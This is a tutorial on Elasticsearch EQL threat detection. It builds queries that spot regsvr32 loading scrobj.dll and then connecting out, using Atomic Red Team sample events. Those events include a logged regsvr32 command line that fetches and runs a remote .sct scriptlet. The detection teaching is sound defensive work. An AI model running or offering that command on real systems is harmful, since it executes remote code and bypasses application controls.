### Example: Detect threats with EQL

See [Example: Detect threats with EQL](https://www.elastic.co/guide/en/elasticsearch/reference/7.17/eql-ex-threat-detection.html)
See [EQL syntax reference](https://www.elastic.co/guide/en/elasticsearch/reference/7.17/eql-syntax.html)

#### Setup

To get started:

1. Create an [index template](https://www.elastic.co/guide/en/elasticsearch/reference/7.17/index-templates.html) with [data stream enabled](https://www.elastic.co/guide/en/elasticsearch/reference/7.17/set-up-a-data-stream.html#create-index-template)

```json

PUT /_index_template/my-data-stream-template
{
  "index_patterns": [ "my-data-stream*" ],
  "data_stream": { },
  "priority": 500
}

```

2. Use the [bulk API](https://www.elastic.co/guide/en/elasticsearch/reference/7.17/docs-bulk.html) to index the data to a matching stream:

```json

curl -XPOST "localhost:9200/my-data-stream/_bulk?pretty&refresh" -s -u elastic:changeme -H 'Content-Type: application/x-ndjson' --data-binary "@dataset/normalized-T1117-AtomicRed-regsvr32.json"

```

3. Use the [cat indices API](https://www.elastic.co/guide/en/elasticsearch/reference/7.17/cat-indices.html) to verify the data was indexed:

```json

GET /_cat/indices/my-data-stream?v=true&h=health,status,index,docs.count

```

#### Get a count of regsvr32 events

```json

GET /my-data-stream/_eql/search?filter_path=-hits.events    
{
  "query": """
    any where process.name == "regsvr32.exe"                
  """,
  "size": 200                                               
}

```

<details>
  <summary>Response:</summary>

```json

{
  "is_partial" : false,
  "is_running" : false,
  "took" : 1,
  "timed_out" : false,
  "hits" : {
    "total" : {
      "value" : 143,
      "relation" : "eq"
    }
  }
}

```

</details>


#### Check for command line artifacts

```json

GET my-data-stream/_eql/search?filter_path=hits.events
{
  "query": """
    any where process.name == "regsvr32.exe" and  process.command_line.keyword !=null
  """,
  "size": 200
}

```

<details>
  <summary>Response:</summary>

```json

{
  "hits" : {
    "events" : [
      {
        "_index" : ".ds-my-data-stream-2023.04.28-000001",
        "_id" : "9v9YxocBJz9yVPk--OPB",
        "_source" : {
          "process" : {
            "parent" : {
              "name" : "cmd.exe",
              "entity_id" : "{42FC7E13-CBCB-5C05-0000-0010AA385401}",
              "executable" : """C:\Windows\System32\cmd.exe"""
            },
            "name" : "regsvr32.exe",
            "pid" : 2012,
            "entity_id" : "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
            "command_line" : "regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll",
            "executable" : """C:\Windows\System32\regsvr32.exe""",
            "ppid" : 2652
          },
          "logon_id" : 217055,
          "@timestamp" : 131883573237130000,
          "event" : {
            "category" : "process",
            "type" : "creation"
          },
          "user" : {
            "full_name" : "bob",
            "domain" : "ART-DESKTOP",
            "id" : """ART-DESKTOP\bob"""
          }
        }
      }
    ]
  }
}

```

</details>

#### Check for malicious script loads

Check if regsvr32.exe later loads the scrobj.dll library:

```json

GET /my-data-stream/_eql/search
{
  "query": """
    any where process.name == "regsvr32.exe"  and dll.name == "scrobj.dll"              
  """
}

```

<details>
  <summary>Response:</summary>

```json

{
  "is_partial" : false,
  "is_running" : false,
  "took" : 1,
  "timed_out" : false,
  "hits" : {
    "total" : {
      "value" : 1,
      "relation" : "eq"
    },
    "events" : [
      {
        "_index" : ".ds-my-data-stream-2023.04.28-000001",
        "_id" : "Fv9YxocBJz9yVPk--OTC",
        "_source" : {
          "process" : {
            "name" : "regsvr32.exe",
            "pid" : 2012,
            "entity_id" : "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
            "executable" : """C:\Windows\System32\regsvr32.exe"""
          },
          "dll" : {
            "path" : """C:\Windows\System32\scrobj.dll""",
            "name" : "scrobj.dll"
          },
          "@timestamp" : 131883573237450016,
          "event" : {
            "category" : "library"
          }
        }
      }
    ]
  }
}

```

</details>

#### Determine the likelihood of success

heck for the following series of events:

1. A regsvr32.exe process
2. A load of the scrobj.dll library by the same process
3. Any network event by the same process

```json

GET /my-data-stream/_eql/search
{
  "query": """
    sequence by process.pid
      [process where process.name == "regsvr32.exe" ]
      [library where dll.name == "scrobj.dll"]
      [network where true]
  """
}

```

<details>
  <summary>Response:</summary>

```json

{
  "is_partial" : false,
  "is_running" : false,
  "took" : 34,
  "timed_out" : false,
  "hits" : {
    "total" : {
      "value" : 1,
      "relation" : "eq"
    },
    "sequences" : [
      {
        "join_keys" : [
          2012
        ],
        "events" : [
          {
            "_index" : ".ds-my-data-stream-2023.04.28-000001",
            "_id" : "9v9YxocBJz9yVPk--OPB",
            "_source" : {
              "process" : {
                "parent" : {
                  "name" : "cmd.exe",
                  "entity_id" : "{42FC7E13-CBCB-5C05-0000-0010AA385401}",
                  "executable" : """C:\Windows\System32\cmd.exe"""
                },
                "name" : "regsvr32.exe",
                "pid" : 2012,
                "entity_id" : "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
                "command_line" : "regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll",
                "executable" : """C:\Windows\System32\regsvr32.exe""",
                "ppid" : 2652
              },
              "logon_id" : 217055,
              "@timestamp" : 131883573237130000,
              "event" : {
                "category" : "process",
                "type" : "creation"
              },
              "user" : {
                "full_name" : "bob",
                "domain" : "ART-DESKTOP",
                "id" : """ART-DESKTOP\bob"""
              }
            }
          },
          {
            "_index" : ".ds-my-data-stream-2023.04.28-000001",
            "_id" : "Fv9YxocBJz9yVPk--OTC",
            "_source" : {
              "process" : {
                "name" : "regsvr32.exe",
                "pid" : 2012,
                "entity_id" : "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
                "executable" : """C:\Windows\System32\regsvr32.exe"""
              },
              "dll" : {
                "path" : """C:\Windows\System32\scrobj.dll""",
                "name" : "scrobj.dll"
              },
              "@timestamp" : 131883573237450016,
              "event" : {
                "category" : "library"
              }
            }
          },
          {
            "_index" : ".ds-my-data-stream-2023.04.28-000001",
            "_id" : "hP9YxocBJz9yVPk--OTC",
            "_source" : {
              "process" : {
                "name" : "regsvr32.exe",
                "pid" : 2012,
                "entity_id" : "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
                "executable" : """C:\Windows\System32\regsvr32.exe"""
              },
              "destination" : {
                "address" : "151.101.48.133",
                "port" : "443"
              },
              "source" : {
                "address" : "192.168.162.134",
                "port" : "50505"
              },
              "network" : {
                "direction" : "outbound",
                "protocol" : "tcp"
              },
              "@timestamp" : 131883573238680000,
              "event" : {
                "category" : "network"
              },
              "user" : {
                "full_name" : "bob",
                "domain" : "ART-DESKTOP",
                "id" : """ART-DESKTOP\bob"""
              }
            }
          }
        ]
      }
    ]
  }
}

```

</details>

